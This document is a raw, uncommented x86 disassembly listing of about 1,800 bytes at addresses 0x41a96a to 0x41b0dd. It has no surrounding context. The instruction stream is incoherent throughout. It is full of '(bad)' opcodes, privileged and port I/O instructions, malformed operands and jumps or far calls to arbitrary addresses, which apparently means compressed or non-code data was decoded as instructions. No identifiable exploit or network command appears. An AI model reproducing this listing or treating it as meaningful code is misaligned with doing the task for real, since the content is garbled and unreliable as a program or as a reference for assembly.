  41a96a:	dec    BYTE PTR [ebx+0x3daeabc2]
  41a970:	dec    esp
  41a971:	(bad)  
  41a972:	cld    
  41a973:	test   al,0xf2
  41a975:	push   ebp
  41a976:	mov    dl,0x63
  41a978:	mov    ebx,0x1fbf518a
  41a97d:	pop    esi
  41a97e:	mov    ebx,0x128ccc04
  41a983:	mov    dl,BYTE PTR [edx+0xba29fc5]
  41a989:	ins    BYTE PTR es:[edi],dx
  41a98a:	xchg   DWORD PTR [eax],ecx
  41a98c:	popa   
  41a98d:	mov    ch,0x34
  41a98f:	adc    BYTE PTR [ebp+0x7d],al
  41a992:	fdiv   QWORD PTR [eax]
  41a994:	call   DWORD PTR [eax-0x47bcb775]
  41a99a:	rcr    DWORD PTR [ecx-0x22],0x7d
  41a99e:	sub    al,0x57
  41a9a0:	mov    dh,0x7a
  41a9a2:	stos   DWORD PTR es:[edi],eax
  41a9a3:	dec    edi
  41a9a4:	daa    
  41a9a5:	sub    al,0xb2
  41a9a7:	push   esi
  41a9a8:	das    
  41a9a9:	shl    DWORD PTR [esi-0x474f3bfd],cl
  41a9af:	sbb    bl,BYTE PTR [eax]
  41a9b1:	scas   eax,DWORD PTR es:[edi]
  41a9b2:	and    DWORD PTR [edx+ebx*8-0x34a9f76e],esp
  41a9b9:	push   eax
  41a9ba:	sar    bh,cl
  41a9bc:	iret   
  41a9bd:	push   edx
  41a9be:	frstor [edx+ecx*8+0x25]
  41a9c2:	sub    BYTE PTR [edi],bh
  41a9c4:	cmp    bl,BYTE PTR [ebx+0x121eb7cb]
  41a9ca:	ja     0x41aa36
  41a9cc:	jnp    0x41aa15
  41a9ce:	repz pop esi
  41a9d0:	sub    DWORD PTR [ebp+0x3b1830fc],edi
  41a9d6:	jl     0x41a967
  41a9d8:	popf   
  41a9d9:	fisubr DWORD PTR [edx-0x80]
  41a9dc:	loopne 0x41a9cc
  41a9de:	gs push eax
  41a9e0:	sbb    ebx,esp
  41a9e2:	mov    cl,0x14
  41a9e4:	daa    
  41a9e5:	(bad)  
  41a9e6:	stos   WORD PTR es:[edi],ax
  41a9e8:	lods   eax,DWORD PTR ds:[esi]
  41a9e9:	add    al,0xa8
  41a9eb:	sub    eax,DWORD PTR [edi-0x7]
  41a9ee:	mov    ch,0x13
  41a9f0:	sbb    ch,BYTE PTR [edi+0x52]
  41a9f3:	das    
  41a9f4:	fidivr DWORD PTR ds:[ebx+eiz*2-0x18]
  41a9f9:	outs   dx,DWORD PTR ds:[esi]
  41a9fa:	xchg   ebp,eax
  41a9fb:	in     eax,dx
  41a9fc:	nop
  41a9fd:	retf   0x2308
  41aa00:	cli    
  41aa01:	and    dl,dh
  41aa03:	sub    al,0xb6
  41aa05:	inc    cl
  41aa07:	retf   
  41aa08:	mov    ecx,0x3a073cf4
  41aa0d:	and    dh,BYTE PTR [ebx+0x558432df]
  41aa13:	mov    ah,0xd6
  41aa15:	xchg   ebx,eax
  41aa16:	adc    BYTE PTR [ebx],dh
  41aa18:	(bad)  
  41aa19:	jbe    0x41a99f
  41aa1b:	jno    0x41aa36
  41aa1d:	xor    edx,DWORD PTR [edi]
  41aa1f:	or     ah,0xd8
  41aa22:	push   ss
  41aa23:	or     al,0xc4
  41aa25:	xchg   BYTE PTR [edi-0x29375425],bl
  41aa2b:	outs   dx,DWORD PTR ds:[esi]
  41aa2c:	pop    ebx
  41aa2d:	je     0x41aa9b
  41aa2f:	arpl   WORD PTR [ebx-0x4b27e55a],cx
  41aa35:	in     al,dx
  41aa36:	mul    DWORD PTR [esi+0x5b]
  41aa39:	pop    ebx
  41aa3a:	push   eax
  41aa3b:	jmp    0xcd7a92f9
  41aa40:	fdivr  DWORD PTR [esi]
  41aa42:	mov    al,ds:0xa1acc66
  41aa47:	(bad)  
  41aa48:	mov    DWORD PTR [ecx+0x412c56a],esi
  41aa4e:	sbb    BYTE PTR [eax-0x11c6dd],ch
  41aa54:	push   ebp
  41aa55:	inc    edi
  41aa56:	pop    ebp
  41aa57:	cmp    edi,0xfffffff0
  41aa5a:	mov    BYTE PTR [edx+eax*8-0x32746fbd],bl
  41aa61:	jmp    0x529c5fc8
  41aa66:	mov    WORD PTR [ebp+ebx*8+0x11cc1fb3],es
  41aa6d:	and    al,0xb2
  41aa6f:	adc    BYTE PTR ds:0x704db828,0xb4
  41aa76:	adc    eax,0xd0f2a357
  41aa7b:	jge    0x41aa74
  41aa7d:	mov    al,BYTE PTR [ecx+0x77]
  41aa80:	sbb    BYTE PTR [ebp-0x4a],ah
  41aa83:	pop    eax
  41aa84:	xchg   BYTE PTR [eax+eiz*1+0x6bdb386],dh
  41aa8b:	mov    cl,0xa6
  41aa8d:	fimul  DWORD PTR [ecx+0x44]
  41aa90:	es and ah,0x5
  41aa94:	jae    0x41aa4f
  41aa96:	pop    ebp
  41aa97:	inc    edx
  41aa98:	xor    ch,dh
  41aa9a:	enter  0xed19,0x3b
  41aa9e:	jle    0x41ab0b
  41aaa0:	outs   dx,BYTE PTR ds:[esi]
  41aaa1:	sub    DWORD PTR [ebx],0x6d
  41aaa4:	fimul  DWORD PTR [edi+ecx*8]
  41aaa7:	div    DWORD PTR ds:0xe0e9ad63
  41aaad:	jge    0x41aa7c
  41aaaf:	jne    0x41aaf9
  41aab1:	iret   
  41aab2:	clc    
  41aab3:	push   ds
  41aab4:	mov    dh,0xf0
  41aab6:	call   0xaee61348
  41aabb:	out    0x1e,al
  41aabd:	sbb    al,0xfa
  41aabf:	call   0x4ebe:0xf5bab29a
  41aac6:	mov    ebx,0x429e0232
  41aacb:	mov    dl,0x32
  41aacd:	icebp  
  41aace:	xlat   BYTE PTR ds:[ebx]
  41aacf:	mov    ?,WORD PTR [ebx]
  41aad1:	mov    ecx,DWORD PTR [edi+0x61]
  41aad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aad5:	out    dx,eax
  41aad6:	xchg   DWORD PTR [eax],edi
  41aad8:	jp     0x41aa9d
  41aada:	lea    ecx,[ecx+0x1e]
  41aadd:	(bad)  
  41aade:	shl    BYTE PTR [ebx+0x5c],1
  41aae1:	(bad)  
  41aae3:	push   esi
  41aae4:	dec    edx
  41aae5:	cmp    al,0x7e
  41aae7:	add    BYTE PTR [ecx+0x2baa85d6],cl
  41aaed:	mov    bl,0xab
  41aaef:	xchg   esp,eax
  41aaf0:	out    0xba,al
  41aaf2:	xor    ebp,edx
  41aaf4:	cs and eax,0x70dc2782
  41aafa:	clc    
  41aafb:	adc    ah,BYTE PTR [ecx+0x632a0319]
  41ab01:	idiv   ebx
  41ab03:	push   edx
  41ab04:	mov    ecx,0xc3c3b958
  41ab09:	mov    eax,ss
  41ab0b:	and    DWORD PTR [edx+ebx*4-0x36],ebx
  41ab0f:	test   ecx,edx
  41ab11:	push   edi
  41ab12:	push   ecx
  41ab13:	repz sti 
  41ab15:	inc    esp
  41ab16:	adc    BYTE PTR [esi+0x4608ec88],0xac
  41ab1d:	test   ebp,esi
  41ab1f:	pop    edx
  41ab20:	mov    edx,es
  41ab22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab23:	mov    al,ds:0x9ec5dedb
  41ab28:	test   eax,0x3e243ac4
  41ab2d:	cmp    al,0xd4
  41ab2f:	out    dx,al
  41ab30:	sbb    eax,0x78b7a278
  41ab35:	mov    dh,0x1
  41ab37:	test   eax,0x964d0573
  41ab3c:	xchg   esp,eax
  41ab3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab3e:	mov    eax,0x5609f0d2
  41ab43:	mov    bl,0x18
  41ab45:	enter  0x4f88,0xae
  41ab49:	fisttp WORD PTR [ecx+0x2b]
  41ab4c:	scas   eax,DWORD PTR es:[edi]
  41ab4d:	cmp    eax,0x544279d3
  41ab52:	or     eax,DWORD PTR [edi]
  41ab54:	dec    ecx
  41ab55:	xor    al,BYTE PTR [edi+ebp*1]
  41ab58:	ror    BYTE PTR [esi],0xd8
  41ab5b:	std    
  41ab5c:	aam    0x48
  41ab5e:	mov    dl,0xcb
  41ab60:	mov    ecx,0x70eb5299
  41ab65:	iret   
  41ab66:	inc    edi
  41ab67:	(bad)  
  41ab68:	ss (bad) 
  41ab6a:	retf   
  41ab6b:	and    ah,BYTE PTR [ebx+0x263e0197]
  41ab71:	ss xchg esi,eax
  41ab73:	call   0x67eac41b
  41ab78:	shl    BYTE PTR [edi-0x22],0xa0
  41ab7c:	jnp    0x41abad
  41ab7e:	xchg   ecx,eax
  41ab7f:	xchg   BYTE PTR ds:0x9d69cef,bh
  41ab85:	dec    esp
  41ab86:	out    0xc4,al
  41ab88:	sbb    dh,BYTE PTR [ebx]
  41ab8a:	dec    si
  41ab8c:	mov    ebx,0x7a5d3f44
  41ab91:	or     BYTE PTR [ebx+0x4f1fe88a],cl
  41ab97:	sar    DWORD PTR [ebx+edx*2],cl
  41ab9a:	mov    dh,0xd5
  41ab9c:	sub    ah,BYTE PTR [esi-0x3e96cf8d]
  41aba2:	fild   DWORD PTR [esi+0x5e]
  41aba5:	mov    WORD PTR [edx+0x48],ds
  41aba8:	into   
  41aba9:	add    dh,BYTE PTR [ebx-0x2a783ae0]
  41abaf:	jbe    0x41ab84
  41abb1:	xor    cl,dh
  41abb3:	dec    edx
  41abb4:	mov    cl,0x72
  41abb6:	test   BYTE PTR [ebp-0x40],bl
  41abb9:	jmp    0xfd67dadf
  41abbe:	out    0x9f,eax
  41abc0:	add    bh,dh
  41abc2:	or     BYTE PTR [ebp-0x39ceef39],ah
  41abc8:	test   BYTE PTR [ecx],cl
  41abca:	adc    al,0x65
  41abcc:	xchg   ebx,eax
  41abcd:	mov    ebp,0x8db3af77
  41abd2:	mov    eax,0xc256de65
  41abd7:	sbb    DWORD PTR [ebx+0x276ad4ed],ecx
  41abdd:	call   0x7243:0x5686735b
  41abe4:	addr16 (bad) 
  41abe6:	pop    edi
  41abe7:	dec    edi
  41abe8:	call   0x7cfa66eb
  41abed:	mov    eax,0xd5f82744
  41abf2:	pop    ecx
  41abf3:	mov    ebp,esp
  41abf5:	push   edx
  41abf6:	or     al,0x53
  41abf8:	sub    ecx,DWORD PTR [ecx-0x44000f04]
  41abfe:	hlt    
  41abff:	xchg   edi,eax
  41ac00:	sub    eax,0x8cc844e
  41ac05:	sub    BYTE PTR [ecx+0x7b],cl
  41ac08:	push   edi
  41ac09:	cdq    
  41ac0a:	aam    0x55
  41ac0c:	jbe    0x41abf5
  41ac0e:	std    
  41ac0f:	mov    esi,0x27789cec
  41ac14:	pop    eax
  41ac15:	adc    al,0xcc
  41ac17:	adc    BYTE PTR [bp-0x7c],ch
  41ac1b:	(bad)  
  41ac1c:	mov    edx,ebp
  41ac1e:	push   cs
  41ac1f:	mov    al,ds:0x219cce0
  41ac24:	call   FWORD PTR [edx-0x1d]
  41ac27:	mov    cl,0x50
  41ac29:	stos   BYTE PTR es:[edi],al
  41ac2a:	pop    edx
  41ac2b:	mov    esp,0x5b9208f3
  41ac30:	inc    eax
  41ac31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac32:	xor    BYTE PTR [ebx+esi*4+0x67ef6f6d],bh
  41ac39:	push   es
  41ac3a:	je     0x41ac07
  41ac3c:	scas   eax,DWORD PTR es:[edi]
  41ac3d:	push   edi
  41ac3e:	pop    ds
  41ac3f:	mov    ebx,0x46ec6691
  41ac44:	jne    0x41acb9
  41ac46:	shl    BYTE PTR [esi+esi*2+0x52],cl
  41ac4a:	or     DWORD PTR [ecx+0x16],edx
  41ac4d:	inc    edx
  41ac4e:	call   0x48b3b855
  41ac53:	jbe    0x41ac0c
  41ac55:	mov    ebx,0xbbcd970e
  41ac5a:	(bad)  
  41ac5b:	fisttp QWORD PTR [esi+0x2e307211]
  41ac61:	sar    BYTE PTR [ebp-0x47bf89e5],1
  41ac67:	dec    esp
  41ac68:	adc    al,0x3a
  41ac6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac6b:	dec    ecx
  41ac6c:	test   al,0x16
  41ac6e:	xchg   edi,eax
  41ac6f:	xchg   esp,eax
  41ac70:	neg    BYTE PTR [ecx+0x51fdde96]
  41ac76:	ret    0x700
  41ac79:	call   0xd975:0x774e3951
  41ac80:	mov    esp,0xe546ec1
  41ac85:	push   ds
  41ac86:	lods   eax,DWORD PTR ds:[esi]
  41ac87:	mov    al,ds:0x6007954e
  41ac8c:	fneni(8087 only) 
  41ac8e:	(bad)  
  41ac8f:	push   ebp
  41ac90:	ins    DWORD PTR es:[edi],dx
  41ac91:	(bad)
  41ac95:	sbb    ch,BYTE PTR [ebx+0x25]
  41ac98:	pop    DWORD PTR [esi+0x39d36db0]
  41ac9e:	fstp   QWORD PTR [eax+0x493f3d79]
  41aca4:	aad    0x30
  41aca6:	dec    eax
  41aca7:	pop    eax
  41aca8:	in     eax,dx
  41aca9:	jns    0x41ac33
  41acab:	jg     0x41accd
  41acad:	dec    ebp
  41acae:	sbb    al,0xdd
  41acb0:	test   eax,edx
  41acb2:	pusha  
  41acb3:	xchg   ecx,eax
  41acb4:	sahf   
  41acb5:	popf   
  41acb6:	ret    0x31f
  41acb9:	mov    cl,0xf8
  41acbb:	xor    ebp,DWORD PTR [esi]
  41acbd:	das    
  41acbe:	sub    BYTE PTR [ebx+0x7e3b8d6b],ch
  41acc4:	jg     0x41acff
  41acc6:	dec    esi
  41acc7:	push   cs
  41acc8:	fdiv   DWORD PTR [ecx]
  41acca:	sub    al,0x96
  41accc:	xchg   esp,eax
  41accd:	rcl    al,1
  41accf:	mov    eax,ds:0x94d1fb42
  41acd4:	(bad)  
  41acd5:	fild   QWORD PTR [edx+ebp*4+0x3a]
  41acd9:	inc    esp
  41acda:	leave  
  41acdb:	mov    bh,0x41
  41acdd:	cld    
  41acde:	mov    bh,BYTE PTR ds:0x2081abc4
  41ace4:	clc    
  41ace5:	stos   BYTE PTR es:[edi],al
  41ace6:	cmp    eax,0xb7b6b2a1
  41aceb:	pusha  
  41acec:	pop    esi
  41aced:	or     DWORD PTR [edx-0x68],0xffffffd5
  41acf1:	sbb    ch,cl
  41acf3:	push   esi
  41acf4:	push   esi
  41acf5:	fstp   DWORD PTR [edi+0x38]
  41acf8:	das    
  41acf9:	and    DWORD PTR [edi-0x7a60b6bb],ebx
  41acff:	xchg   ebx,eax
  41ad00:	mov    al,0xa5
  41ad02:	mov    ch,0xba
  41ad04:	sbb    esp,DWORD PTR [edi-0x2b017dee]
  41ad0a:	dec    edi
  41ad0b:	inc    edx
  41ad0c:	in     al,dx
  41ad0d:	dec    edi
  41ad0e:	mov    bh,0x10
  41ad10:	sti    
  41ad11:	fsub   DWORD PTR [esi+0x497b2758]
  41ad17:	add    dl,BYTE PTR [esi+0x49387b24]
  41ad1d:	sub    edx,DWORD PTR [ecx-0x32]
  41ad20:	mov    ecx,0x649bff57
  41ad25:	mov    dl,BYTE PTR [ebx]
  41ad27:	inc    esp
  41ad28:	lods   eax,DWORD PTR ds:[esi]
  41ad29:	jg     0x41acb5
  41ad2b:	addr16 pop esi
  41ad2d:	(bad)  
  41ad2e:	jae    0x41ad77
  41ad30:	xor    eax,0x5c5e53eb
  41ad35:	xchg   edi,eax
  41ad36:	retf   0x14f1
  41ad39:	mov    ah,0xbf
  41ad3b:	mov    ebx,0x483a976f
  41ad40:	adc    dl,BYTE PTR [edi-0x51f80a75]
  41ad46:	ds mov ecx,0x8e17e53c
  41ad4c:	jmp    0x32a5:0xff3bb26d
  41ad53:	and    bl,BYTE PTR [eax]
  41ad55:	xor    BYTE PTR [edx+0x6ab7cd02],0xe4
  41ad5c:	cmp    al,0x96
  41ad5e:	xlat   BYTE PTR ds:[ebx]
  41ad5f:	cmp    cl,dl
  41ad61:	mov    ah,0x48
  41ad63:	push   eax
  41ad64:	in     eax,dx
  41ad65:	shl    BYTE PTR [ebx+0xa],cl
  41ad68:	cwde   
  41ad69:	inc    esi
  41ad6a:	dec    esp
  41ad6b:	mov    al,BYTE PTR [esi-0x362a77c2]
  41ad71:	mov    ds,WORD PTR [esi+0x3c]
  41ad74:	cmp    BYTE PTR [esi+0x18bf2249],al
  41ad7a:	dec    ebp
  41ad7b:	ja     0x41adf2
  41ad7d:	cdq    
  41ad7e:	das    
  41ad7f:	jns    0x41ad54
  41ad81:	xchg   esp,eax
  41ad82:	sbb    edi,DWORD PTR [edi-0x11]
  41ad85:	inc    eax
  41ad86:	mov    edx,0x55147f9d
  41ad8b:	pop    ecx
  41ad8c:	mov    bh,0xf4
  41ad8e:	or     DWORD PTR [edx+ecx*1+0x58e1b224],esi
  41ad95:	cmp    esi,eax
  41ad97:	xchg   DWORD PTR [ebp+0x275af665],ebx
  41ad9d:	dec    ebp
  41ad9e:	test   al,0xa1
  41ada0:	add    al,0xc6
  41ada2:	sub    DWORD PTR [edx-0x4f],esp
  41ada5:	fsub   st,st(6)
  41ada7:	or     esp,DWORD PTR [ebp+0x4ee58fa5]
  41adad:	fidivr DWORD PTR [ebp+0x626db023]
  41adb3:	add    edx,eax
  41adb5:	rol    DWORD PTR [esi+eiz*2-0x37],1
  41adb9:	rcl    DWORD PTR [edi+edx*2],1
  41adbc:	fnstcw WORD PTR [edx-0x1d]
  41adbf:	(bad)  
  41adc0:	mov    eax,ds:0xb613c328
  41adc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adc6:	cld    
  41adc7:	and    esi,DWORD PTR [esi+eax*4]
  41adca:	adc    al,BYTE PTR [ecx]
  41adcc:	cmp    cl,bl
  41adce:	daa    
  41adcf:	imul   edx,DWORD PTR [edx+eax*2],0x25
  41add3:	popf   
  41add4:	mov    ebp,0xe03969cd
  41add9:	xor    DWORD PTR [esp+eax*2],ecx
  41addc:	lahf   
  41addd:	sbb    eax,0xe0fdc64
  41ade2:	xchg   ah,cl
  41ade4:	in     eax,0xee
  41ade6:	mov    al,0xf0
  41ade8:	popf   
  41ade9:	jo     0x41ae66
  41adeb:	mov    dh,0xf3
  41aded:	repnz mov DWORD PTR [edi+0x23],ecx
  41adf1:	push   eax
  41adf2:	mov    esp,?
  41adf4:	sbb    DWORD PTR [edx-0x22],0xdd231c13
  41adfb:	mov    ebx,0x3f99c7d2
  41ae00:	(bad)  
  41ae01:	pop    edx
  41ae02:	xchg   ebx,eax
  41ae03:	jmp    FWORD PTR [edx+0x3b2e05f0]
  41ae09:	pop    ebp
  41ae0a:	sbb    al,0x38
  41ae0c:	mov    esp,0x5d649f09
  41ae11:	xchg   ecx,eax
  41ae12:	xor    eax,0x10052b34
  41ae17:	lock pop ebx
  41ae19:	lods   al,BYTE PTR ds:[esi]
  41ae1a:	loope  0x41ae39
  41ae1c:	dec    edx
  41ae1d:	push   0x7f
  41ae1f:	adc    BYTE PTR [edx-0x3d],0x4c
  41ae23:	popf   
  41ae24:	in     eax,0x1c
  41ae26:	jb     0x41aea0
  41ae28:	xchg   DWORD PTR [esi-0x4a],ebx
  41ae2b:	push   cs
  41ae2c:	inc    esp
  41ae2d:	test   DWORD PTR [esi-0x53b5ffbf],ebp
  41ae33:	sbb    BYTE PTR [ecx-0x17054711],dh
  41ae39:	mov    cs,WORD PTR [ecx+0x2c]
  41ae3c:	add    DWORD PTR [esi-0x1592beba],0x4
  41ae43:	scas   al,BYTE PTR es:[edi]
  41ae44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae45:	mov    edx,0xdda326e8
  41ae4a:	jecxz  0x41ae9c
  41ae4c:	scas   eax,DWORD PTR es:[edi]
  41ae4d:	pop    esp
  41ae4e:	sahf   
  41ae4f:	sbb    BYTE PTR [ecx+0x5],0x4c
  41ae53:	pop    es
  41ae54:	push   0x1ef86472
  41ae59:	out    0x82,al
  41ae5b:	pop    ss
  41ae5c:	in     eax,0xb7
  41ae5e:	pop    ss
  41ae5f:	or     al,0xa2
  41ae61:	cmp    al,BYTE PTR [edx+esi*4+0x68]
  41ae65:	push   eax
  41ae66:	je     0x41aeda
  41ae68:	push   esp
  41ae69:	inc    ebp
  41ae6a:	xchg   esi,eax
  41ae6b:	xlat   BYTE PTR ds:[ebx]
  41ae6c:	test   al,0x7e
  41ae6e:	pop    ds
  41ae6f:	scas   eax,DWORD PTR es:[edi]
  41ae70:	xchg   esp,eax
  41ae71:	mov    edx,0xa0b73bb5
  41ae76:	or     al,0xad
  41ae78:	ins    DWORD PTR es:[edi],dx
  41ae79:	cmc    
  41ae7a:	sbb    dl,BYTE PTR [ebx]
  41ae7c:	fst    st(7)
  41ae7e:	jl     0x41aed6
  41ae80:	(bad)  
  41ae81:	shl    DWORD PTR [ecx],1
  41ae83:	fisttp WORD PTR [ecx+0x60bc4cb4]
  41ae89:	cmp    al,0x45
  41ae8b:	xchg   edi,eax
  41ae8c:	sub    edx,DWORD PTR [ebx-0x72]
  41ae8f:	mov    al,ds:0x52f1a8a8
  41ae94:	jl     0x41af08
  41ae96:	mov    bh,ah
  41ae98:	xor    al,0xd5
  41ae9a:	aam    0xb0
  41ae9c:	dec    esi
  41ae9d:	xchg   ebp,eax
  41ae9e:	jno    0x41ae28
  41aea0:	push   edi
  41aea1:	js     0x41aea2
  41aea3:	cli    
  41aea4:	cmp    BYTE PTR [edx+0x65],ah
  41aea7:	sbb    ebx,ebx
  41aea9:	sbb    eax,0x96ca032d
  41aeae:	inc    ecx
  41aeaf:	mov    dl,0x6e
  41aeb1:	jmp    FWORD PTR [ebx+ebx*1+0x2f]
  41aeb5:	mov    ds:0x5ae27d49,eax
  41aeba:	test   eax,0x521734f9
  41aebf:	adc    DWORD PTR ss:[edx],edx
  41aec2:	push   edi
  41aec3:	cmp    eax,DWORD PTR [edi+0x392a9f6b]
  41aec9:	inc    ecx
  41aeca:	in     eax,0xa6
  41aecc:	loop   0x41aeef
  41aece:	push   ebp
  41aecf:	mov    edi,0xe4354578
  41aed4:	push   0x2e
  41aed6:	ss dec esi
  41aed8:	test   eax,0x96ed68e0
  41aedd:	jmp    0x1d19:0xa5dd044c
  41aee4:	fstp   DWORD PTR [edi-0x3a]
  41aee7:	pushf  
  41aee8:	int3   
  41aee9:	dec    ebp
  41aeea:	les    esi,FWORD PTR ds:0x1ba0c683
  41aef0:	mov    WORD PTR [ebp-0x6c],fs
  41aef3:	rcl    BYTE PTR [eax-0x50],0xa4
  41aef7:	sbb    eax,0x32
  41aefa:	mov    es,WORD PTR [eax]
  41aefc:	xlat   BYTE PTR ds:[ebx]
  41aefd:	jmp    0x41af73
  41aeff:	call   0xbc0f072f
  41af04:	imul   eax,DWORD PTR ds:[edx-0x54],0x3a
  41af09:	sub    eax,0x77500941
  41af0e:	and    bl,dh
  41af10:	repnz or dl,bl
  41af13:	pop    esi
  41af14:	cmp    al,0x4b
  41af16:	and    BYTE PTR [eax+0x54],ch
  41af19:	pop    ebx
  41af1a:	xor    bl,cl
  41af1c:	sub    DWORD PTR ss:[ebx+0x2bc4c371],ebp
  41af23:	or     ebp,edi
  41af25:	popa   
  41af26:	pop    ss
  41af27:	call   0x5069f0c3
  41af2c:	ror    eax,1
  41af2e:	cmp    ecx,esp
  41af30:	call   0xf3e7:0x803c9f0b
  41af37:	popf   
  41af38:	jl     0x41af06
  41af3a:	dec    ebx
  41af3b:	lods   al,BYTE PTR ds:[esi]
  41af3c:	inc    ebp
  41af3d:	sbb    ah,BYTE PTR [edx+0x6f16154f]
  41af43:	push   ebx
  41af44:	adc    eax,0x18de4c07
  41af49:	xlat   BYTE PTR ds:[ebx]
  41af4a:	repnz pop eax
  41af4c:	aaa    
  41af4d:	sub    al,0xbb
  41af4f:	adc    eax,0x37a09e73
  41af54:	jmp    0x41aee0
  41af56:	cmp    eax,eax
  41af58:	pusha  
  41af59:	dec    ebx
  41af5a:	dec    ebx
  41af5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af5c:	add    BYTE PTR [edx-0x3d413176],dh
  41af62:	jg     0x41af43
  41af64:	dec    edi
  41af65:	inc    edx
  41af66:	loop   0x41af43
  41af68:	pop    edi
  41af69:	(bad)  
  41af6a:	jl     0x41af03
  41af6c:	fadd   QWORD PTR ds:0xa0cd672e
  41af72:	cld    
  41af73:	lahf   
  41af74:	enter  0x3fa8,0x14
  41af78:	imul   ebp,DWORD PTR [eax],0xffffffe5
  41af7b:	mov    edx,0x880dbbcb
  41af80:	loop   0x41afcb
  41af82:	hlt    
  41af83:	je     0x41afdd
  41af85:	inc    eax
  41af86:	aad    0x2b
  41af88:	sbb    eax,edx
  41af8a:	nop
  41af8b:	cli    
  41af8c:	lea    ecx,[edx+0x79]
  41af8f:	arpl   WORD PTR [edx+0x39cb443d],di
  41af95:	dec    esi
  41af96:	dec    esi
  41af97:	inc    ebp
  41af98:	dec    ebx
  41af99:	and    BYTE PTR [esi],dl
  41af9b:	adc    BYTE PTR [ecx-0x23],0x31
  41af9f:	mov    cl,0xc5
  41afa1:	mov    ?,WORD PTR [edx-0x53]
  41afa4:	and    dh,BYTE PTR [ebx+esi*2]
  41afa7:	cmp    eax,0x94736528
  41afac:	and    al,0x15
  41afae:	daa    
  41afaf:	cs in  eax,dx
  41afb1:	outs   dx,DWORD PTR ds:[esi]
  41afb2:	xlat   BYTE PTR ds:[ebx]
  41afb3:	mov    ebp,0x68844422
  41afb8:	jno    0x41af70
  41afba:	inc    esi
  41afbb:	nop
  41afbc:	mov    ds,WORD PTR [eax]
  41afbe:	sub    al,0x0
  41afc0:	(bad)  
  41afc1:	push   ebp
  41afc2:	(bad)  
  41afc3:	mov    ebx,0x5b07bc00
  41afc8:	and    edi,ebp
  41afca:	sub    eax,0x914dc05
  41afcf:	bound  esi,QWORD PTR [ebp+0x338eb7b6]
  41afd5:	mov    esi,edi
  41afd7:	push   edx
  41afd8:	jne    0x41afd1
  41afda:	outs   dx,BYTE PTR ds:[esi]
  41afdb:	es cs ins BYTE PTR es:[edi],dx
  41afde:	dec    ebp
  41afdf:	mov    ds:0x701111e6,al
  41afe4:	xchg   DWORD PTR [edx],edx
  41afe6:	jbe    0x41af90
  41afe8:	cli    
  41afe9:	inc    edx
  41afea:	cmp    al,0xed
  41afec:	outs   dx,DWORD PTR ds:[esi]
  41afed:	or     edx,DWORD PTR [ecx]
  41afef:	push   esp
  41aff0:	retf   0x84be
  41aff3:	xor    al,0xbf
  41aff5:	jmp    0x41b017
  41aff7:	fistp  DWORD PTR [esi+0x66ba88b9]
  41affd:	popa   
  41affe:	adc    edx,DWORD PTR [edx-0x20]
  41b001:	call   0xa24:0xeb661b7f
  41b008:	jbe    0x41afa6
  41b00a:	xlat   BYTE PTR ds:[ebx]
  41b00b:	pusha  
  41b00c:	adc    bh,bl
  41b00e:	scas   eax,DWORD PTR es:[edi]
  41b00f:	xchg   esi,eax
  41b010:	mov    dl,0x6c
  41b012:	icebp  
  41b013:	xor    bh,al
  41b015:	xor    al,0x51
  41b017:	aad    0x1c
  41b019:	stc    
  41b01a:	push   esi
  41b01b:	bound  esp,QWORD PTR [ebx-0x614e6461]
  41b021:	(bad)  
  41b022:	sub    dh,al
  41b024:	xlat   BYTE PTR ds:[ebx]
  41b025:	les    ecx,FWORD PTR [edi-0x78ef24f9]
  41b02b:	mov    ch,0xf7
  41b02d:	adc    eax,0xb9896662
  41b032:	pushf  
  41b033:	bt     ebx,ebx
  41b036:	adc    dl,BYTE PTR [eax-0x799e3b76]
  41b03c:	jns    0x41b074
  41b03e:	pop    esp
  41b03f:	ret    
  41b040:	cs fucomip st,st(4)
  41b043:	inc    edi
  41b044:	test   bh,bl
  41b046:	pop    ecx
  41b047:	pop    edi
  41b048:	add    DWORD PTR [edx+0x1f559396],ecx
  41b04e:	xchg   ebx,eax
  41b04f:	xchg   ecx,eax
  41b050:	push   0xf86ceecc
  41b055:	pop    ds
  41b056:	and    ah,BYTE PTR [esi+0x2e]
  41b059:	dec    ecx
  41b05a:	aad    0x6b
  41b05c:	out    dx,eax
  41b05d:	dec    ecx
  41b05e:	or     DWORD PTR [edx-0x6],esp
  41b061:	jne    0x41b02d
  41b063:	frstor [ebx+0x6a]
  41b066:	add    BYTE PTR [ecx+0x14bcd797],ch
  41b06c:	test   eax,0x38b1933e
  41b071:	repnz adc ax,0xd13c
  41b076:	add    esi,DWORD PTR [edi-0x2f0248f6]
  41b07c:	lock in al,dx
  41b07e:	stos   DWORD PTR es:[edi],eax
  41b07f:	pop    esp
  41b080:	(bad)  
  41b082:	sub    eax,0xced01280
  41b087:	pop    edi
  41b088:	fisub  WORD PTR [edi]
  41b08a:	test   al,0xc
  41b08c:	daa    
  41b08d:	adc    DWORD PTR [esi+0x62],edi
  41b090:	loope  0x41b09d
  41b092:	jmp    0x41b034
  41b094:	not    DWORD PTR [ecx-0x231b3034]
  41b09a:	xor    eax,0xf74959c4
  41b09f:	mov    ebx,0x1cf1c7e3
  41b0a4:	push   0xf8651141
  41b0a9:	and    ecx,DWORD PTR [esi]
  41b0ab:	cmp    BYTE PTR [ebp-0x5bcc7b53],ch
  41b0b1:	cld    
  41b0b2:	outs   dx,BYTE PTR ds:[esi]
  41b0b3:	adc    DWORD PTR [ebx],esp
  41b0b5:	sbb    ecx,ecx
  41b0b7:	jmp    0x3773:0x91fa65aa
  41b0be:	inc    ebp
  41b0bf:	hlt    
  41b0c0:	ss ret 
  41b0c2:	aad    0xd9
  41b0c4:	inc    ebp
  41b0c5:	mov    ebx,0x5f7c44af
  41b0ca:	(bad)  
  41b0cb:	ins    BYTE PTR es:[edi],dx
  41b0cc:	and    esp,edi
  41b0ce:	popf   
  41b0cf:	add    esp,DWORD PTR [eax+eiz*8-0x19]
  41b0d3:	shl    edx,1
  41b0d5:	sbb    eax,DWORD PTR [edi]
  41b0d7:	mov    edx,0xeaa429a6
  41b0dc:	retf   
  41b0dd:	aaa    
